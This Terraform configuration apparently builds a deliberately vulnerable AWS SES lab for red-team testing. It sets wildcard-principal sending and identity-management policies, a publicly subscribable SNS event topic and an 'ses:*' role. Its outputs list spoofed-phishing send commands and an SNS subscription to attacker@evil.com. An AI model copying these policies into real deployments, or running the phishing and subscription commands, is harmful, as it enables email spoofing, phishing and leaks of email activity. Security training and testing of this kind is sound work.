# Vulnerable SES Identity Configuration
# This Terraform configuration creates vulnerable SES identities that can be exploited

terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.aws_region
}

variable "aws_region" {
  description = "AWS region to deploy resources"
  type        = string
  default     = "us-east-1"
}

variable "environment" {
  description = "Environment name"
  type        = string
  default     = "redteam-test"
}

variable "test_domain" {
  description = "Test domain for SES configuration (should be a domain you control)"
  type        = string
  default     = "redteam-test.example.com"
}

variable "test_email" {
  description = "Test email address for SES configuration"
  type        = string
  default     = "admin@redteam-test.example.com"
}

# Vulnerable email identity - allows anyone to send from this address
resource "aws_ses_email_identity" "vulnerable_email" {
  email = var.test_email

  tags = {
    Environment = var.environment
    Purpose     = "Red Team Testing - Vulnerable Email Identity"
    Attack      = "SES Identity Spoofing"
  }
}

# Vulnerable domain identity with loose verification
resource "aws_ses_domain_identity" "vulnerable_domain" {
  domain = var.test_domain

  tags = {
    Environment = var.environment
    Purpose     = "Red Team Testing - Vulnerable Domain"
    Attack      = "SES Identity Spoofing"
  }
}

# Overly permissive sending authorization policy - VULNERABLE
resource "aws_ses_identity_policy" "vulnerable_sending_policy" {
  identity = aws_ses_email_identity.vulnerable_email.email
  name     = "VulnerableSendingPolicy"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowCrossAccountSending"
        Effect = "Allow"
        Principal = "*"  # VULNERABILITY: Allows anyone to send
        Action = [
          "ses:SendEmail",
          "ses:SendRawEmail"
        ]
        Resource = "arn:aws:ses:${var.aws_region}:${data.aws_caller_identity.current.account_id}:identity/${var.test_email}"
      }
    ]
  })
}

# Domain policy that's too permissive
resource "aws_ses_identity_policy" "vulnerable_domain_policy" {
  identity = aws_ses_domain_identity.vulnerable_domain.domain
  name     = "VulnerableDomainPolicy"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowAnySubdomain"
        Effect = "Allow"
        Principal = "*"  # VULNERABILITY: No restrictions
        Action = [
          "ses:SendEmail",
          "ses:SendRawEmail"
        ]
        Resource = "arn:aws:ses:${var.aws_region}:${data.aws_caller_identity.current.account_id}:identity/${var.test_domain}"
      },
      {
        Sid    = "AllowIdentityManagement"
        Effect = "Allow"
        Principal = "*"  # VULNERABILITY: Allows identity manipulation
        Action = [
          "ses:VerifyEmailIdentity",
          "ses:VerifyDomainIdentity",
          "ses:PutIdentityPolicy",
          "ses:DeleteIdentityPolicy"
        ]
        Resource = "*"
      }
    ]
  })
}

# Vulnerable SES configuration set
resource "aws_ses_configuration_set" "vulnerable_config_set" {
  name = "${var.environment}-vulnerable-config"

  tags = {
    Environment = var.environment
    Purpose     = "Vulnerable configuration set"
  }
}

# Event destination that could leak information
resource "aws_ses_event_destination" "vulnerable_events" {
  name                   = "vulnerable-events"
  configuration_set_name = aws_ses_configuration_set.vulnerable_config_set.name
  enabled                = true

  # Send events to an SNS topic (could be hijacked)
  sns_destination {
    topic_arn = aws_sns_topic.ses_events.arn
  }

  matching_types = [
    "send",
    "reject",
    "bounce",
    "complaint",
    "delivery",
    "open",
    "click"
  ]
}

# SNS topic for SES events - also vulnerable
resource "aws_sns_topic" "ses_events" {
  name = "${var.environment}-ses-events"

  tags = {
    Environment = var.environment
    Purpose     = "SES event notifications"
  }
}

# Overly permissive SNS topic policy
resource "aws_sns_topic_policy" "ses_events_policy" {
  arn = aws_sns_topic.ses_events.arn

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "ses.amazonaws.com"
        }
        Action = "sns:Publish"
        Resource = aws_sns_topic.ses_events.arn
      },
      {
        Sid    = "AllowPublicSubscribe"
        Effect = "Allow"
        Principal = "*"  # VULNERABILITY: Anyone can subscribe
        Action = [
          "sns:Subscribe",
          "sns:Receive"
        ]
        Resource = aws_sns_topic.ses_events.arn
      }
    ]
  })
}

# Vulnerable email template
resource "aws_ses_template" "vulnerable_template" {
  name = "${var.environment}-notification-template"

  subject = "{{subject}}"  # User-controlled input
  html    = <<-EOT
    <html>
    <body>
      <h1>{{title}}</h1>
      <p>Dear {{name}},</p>
      <p>{{message}}</p>
      <p>{{footer}}</p>
      <p>Best regards,<br>{{sender_name}}</p>
    </body>
    </html>
  EOT

  text = <<-EOT
    {{title}}
    
    Dear {{name}},
    
    {{message}}
    
    {{footer}}
    
    Best regards,
    {{sender_name}}
  EOT

  tags = {
    Environment = var.environment
    Purpose     = "Vulnerable email template"
  }
}

# IAM role that red teamers might obtain
resource "aws_iam_role" "redteam_ses_role" {
  name = "${var.environment}-redteam-ses-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root"
        }
      }
    ]
  })

  tags = {
    Environment = var.environment
    Purpose     = "Red Team SES Testing Role"
  }
}

# Overly broad SES permissions
resource "aws_iam_role_policy" "redteam_ses_policy" {
  name = "${var.environment}-redteam-ses-policy"
  role = aws_iam_role.redteam_ses_role.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "ses:*"  # VULNERABILITY: Too broad permissions
        ]
        Resource = "*"
      },
      {
        Effect = "Allow"
        Action = [
          "sns:Subscribe",
          "sns:Unsubscribe",
          "sns:ListSubscriptions"
        ]
        Resource = "*"
      }
    ]
  })
}

# Create a "legitimate" application role for comparison
resource "aws_iam_role" "app_role" {
  name = "${var.environment}-app-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "ec2.amazonaws.com"
        }
      }
    ]
  })

  tags = {
    Environment = var.environment
    Purpose     = "Application role"
  }
}

# Application role with specific SES permissions
resource "aws_iam_role_policy" "app_ses_policy" {
  name = "${var.environment}-app-ses-policy"
  role = aws_iam_role.app_role.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "ses:SendEmail",
          "ses:SendRawEmail",
          "ses:SendTemplatedEmail"
        ]
        Resource = [
          "arn:aws:ses:${var.aws_region}:${data.aws_caller_identity.current.account_id}:identity/${var.test_email}",
          "arn:aws:ses:${var.aws_region}:${data.aws_caller_identity.current.account_id}:template/${aws_ses_template.vulnerable_template.name}"
        ]
      }
    ]
  })
}

data "aws_caller_identity" "current" {}

# Outputs for red team testing
output "vulnerable_email_identity" {
  description = "Vulnerable email identity"
  value       = aws_ses_email_identity.vulnerable_email.email
}

output "vulnerable_domain_identity" {
  description = "Vulnerable domain identity"
  value       = aws_ses_domain_identity.vulnerable_domain.domain
}

output "redteam_role_arn" {
  description = "Red team role ARN"
  value       = aws_iam_role.redteam_ses_role.arn
}

output "configuration_set_name" {
  description = "SES configuration set name"
  value       = aws_ses_configuration_set.vulnerable_config_set.name
}

output "email_template_name" {
  description = "Vulnerable email template name"
  value       = aws_ses_template.vulnerable_template.name
}

output "sns_topic_arn" {
  description = "SNS topic for SES events"
  value       = aws_sns_topic.ses_events.arn
}

output "attack_examples" {
  description = "Example attack commands"
  value = <<-EOT
    # 1. Assume the red team role:
    aws sts assume-role --role-arn ${aws_iam_role.redteam_ses_role.arn} --role-session-name RedTeamSESTest

    # 2. Verify domain ownership (if not already verified):
    aws ses verify-domain-identity --domain ${var.test_domain}

    # 3. Send a spoofed email:
    aws ses send-email \
      --source "admin@${var.test_domain}" \
      --destination "ToAddresses=target@victim.com" \
      --message "Subject={Data='Important Security Alert',Charset=utf8},Body={Text={Data='Your account has been compromised. Click here to secure it: http://malicious-site.com',Charset=utf8}}"

    # 4. Use template for phishing:
    aws ses send-templated-email \
      --source "${var.test_email}" \
      --destination "ToAddresses=target@victim.com" \
      --template "${aws_ses_template.vulnerable_template.name}" \
      --template-data '{"subject":"Password Reset Required","title":"Security Alert","name":"User","message":"Your password will expire soon. Click here to reset: http://malicious-site.com","footer":"This is an automated message.","sender_name":"IT Security Team"}'

    # 5. Subscribe to SES events to monitor email activity:
    aws sns subscribe --topic-arn ${aws_sns_topic.ses_events.arn} --protocol email --notification-endpoint attacker@evil.com
  EOT
}

output "verification_instructions" {
  description = "Instructions for domain verification"
  value = <<-EOT
    To complete the attack scenario, you need to verify the domain ${var.test_domain}:
    
    1. Add this TXT record to your DNS:
       Name: _amazonses.${var.test_domain}
       Value: ${aws_ses_domain_identity.vulnerable_domain.verification_token}
    
    2. Or verify via email by adding an email address at the domain
    
    Note: Use a domain you control for testing purposes only!
  EOT
}
